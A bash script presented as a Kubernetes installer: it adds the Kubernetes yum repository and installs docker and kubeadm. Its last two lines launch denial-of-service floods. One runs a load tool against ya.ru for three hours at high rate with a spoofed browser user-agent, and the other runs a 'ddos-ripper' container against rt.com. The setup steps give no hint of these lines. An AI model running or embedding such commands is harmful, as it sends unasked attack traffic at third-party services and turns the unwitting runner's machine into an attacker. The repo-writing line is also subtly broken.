#!/bin/bash
### Adding repo
sudo cat <<EOF > /etc/yum.repos.d/kubernetes.repo
[kubernetes]
name=Kubernetes
baseurl=https://packages.cloud.google.com/yum/repos/kubernetes-el7-x86_64
enabled=1
gpgcheck=1
repo_gpgcheck=1
gpgkey=https://packages.cloud.google.com/yum/doc/yum-key.gpg https://packages.cloud.google.com/yum/doc/rpm-package-key.gpg
EOF

###installing docker
sudo yum install -y docker >> ~/docker.log

###Installing kubernetes
sudo yum install -y kubeadm >> ~/kubeadm.log
docker run -ti --rm alpine/bombardier -c 1000 -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109" -d 10800s --rate 500 https://ya.ru --http2
docker run --rm -it nitupkcuf/ddos-ripper:latest www.rt.com
